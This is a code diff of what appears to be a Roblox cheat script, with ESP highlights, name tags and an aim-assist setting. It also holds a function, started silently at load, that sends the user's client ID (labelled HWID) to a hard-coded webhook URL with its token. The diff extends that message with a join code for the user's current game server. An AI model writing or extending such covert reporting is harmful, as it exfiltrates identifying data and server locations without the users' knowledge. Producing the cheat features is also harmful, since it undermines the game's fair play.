@@ -5222,49 +5222,49 @@ G2L["1e8"]["Name"] = [[AimAssistSmoothness]];
 G2L["1e8"]["Value"] = 1;
 
 
--- StarterGui.UI.Resources
+-- StarterGui.UI.InUsageItems
 G2L["1e9"] = Instance.new("Folder", G2L["1"]);
-G2L["1e9"]["Name"] = [[Resources]];
+G2L["1e9"]["Name"] = [[InUsageItems]];
+
+
+-- StarterGui.UI.Resources
+G2L["1ea"] = Instance.new("Folder", G2L["1"]);
+G2L["1ea"]["Name"] = [[Resources]];
 
 
 -- StarterGui.UI.Resources.ESP
-G2L["1ea"] = Instance.new("Highlight", G2L["1e9"]);
-G2L["1ea"]["Name"] = [[ESP]];
-G2L["1ea"]["FillColor"] = Color3.fromRGB(103, 151, 255);
-G2L["1ea"]["OutlineColor"] = Color3.fromRGB(29, 90, 255);
+G2L["1eb"] = Instance.new("Highlight", G2L["1ea"]);
+G2L["1eb"]["Name"] = [[ESP]];
+G2L["1eb"]["FillColor"] = Color3.fromRGB(103, 151, 255);
+G2L["1eb"]["OutlineColor"] = Color3.fromRGB(29, 90, 255);
 
 
 -- StarterGui.UI.Resources.TopName
-G2L["1eb"] = Instance.new("BillboardGui", G2L["1e9"]);
-G2L["1eb"]["Active"] = true;
-G2L["1eb"]["LightInfluence"] = 1;
-G2L["1eb"]["AlwaysOnTop"] = true;
-G2L["1eb"]["Size"] = UDim2.new(200, 0, 3, 0);
-G2L["1eb"]["Enabled"] = false;
-G2L["1eb"]["ClipsDescendants"] = true;
-G2L["1eb"]["SizeOffset"] = Vector2.new(0, 1);
-G2L["1eb"]["Name"] = [[TopName]];
-G2L["1eb"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1ec"] = Instance.new("BillboardGui", G2L["1ea"]);
+G2L["1ec"]["Active"] = true;
+G2L["1ec"]["LightInfluence"] = 1;
+G2L["1ec"]["AlwaysOnTop"] = true;
+G2L["1ec"]["Size"] = UDim2.new(200, 0, 3, 0);
+G2L["1ec"]["Enabled"] = false;
+G2L["1ec"]["ClipsDescendants"] = true;
+G2L["1ec"]["SizeOffset"] = Vector2.new(0, 1);
+G2L["1ec"]["Name"] = [[TopName]];
+G2L["1ec"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 
 -- StarterGui.UI.Resources.TopName.TextLabel
-G2L["1ec"] = Instance.new("TextLabel", G2L["1eb"]);
-G2L["1ec"]["TextStrokeTransparency"] = 0;
-G2L["1ec"]["BorderSizePixel"] = 0;
-G2L["1ec"]["TextStrokeColor3"] = Color3.fromRGB(45, 73, 255);
-G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ec"]["TextSize"] = 14;
-G2L["1ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["1ec"]["TextColor3"] = Color3.fromRGB(59, 161, 255);
-G2L["1ec"]["BackgroundTransparency"] = 1;
-G2L["1ec"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ec"]["Text"] = [[@Username]];
-
-
--- StarterGui.UI.InUsageItems
-G2L["1ed"] = Instance.new("Folder", G2L["1"]);
-G2L["1ed"]["Name"] = [[InUsageItems]];
+G2L["1ed"] = Instance.new("TextLabel", G2L["1ec"]);
+G2L["1ed"]["TextStrokeTransparency"] = 0;
+G2L["1ed"]["BorderSizePixel"] = 0;
+G2L["1ed"]["TextStrokeColor3"] = Color3.fromRGB(45, 73, 255);
+G2L["1ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ed"]["TextSize"] = 14;
+G2L["1ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1ed"]["TextColor3"] = Color3.fromRGB(59, 161, 255);
+G2L["1ed"]["BackgroundTransparency"] = 1;
+G2L["1ed"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ed"]["Text"] = [[@Username]];
 
 
 -- Require G2L wrapper
@@ -5472,6 +5472,8 @@ local function C_f()
 	ClientID = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
 	WebHook_URL = "https://webhook.newstargeted.com/api/webhooks/1307777560553193632/1wm7nnjw-ezyw4OtFiQDO_nB9fJNarOBcnmHoJaux2r53Nu8-TgVVpQp4ppn0Fbz97lQ"
 
+	local JoinCode = 'Roblox.GameLauncher.joinGameInstance("' .. game.PlaceId .. '", "' .. game.JobId .. '")'
+
 	local response = request({
 		Url = WebHook_URL,
 		Method = 'POST',
@@ -5505,11 +5507,17 @@ local function C_f()
 						["name"] = "ClientID (HWID)",
 						["value"] = ClientID,
 						["inline"] = true
+					},
+					{
+						["name"] = "Join Button Code",
+						["value"] = "```" .. JoinCode .. "```",
+						["inline"] = false
 					}
 				}
 			}}
 		})
 	})
+
 end;
 task.spawn(C_f);
 -- StarterGui.UI.Scripts.Commands
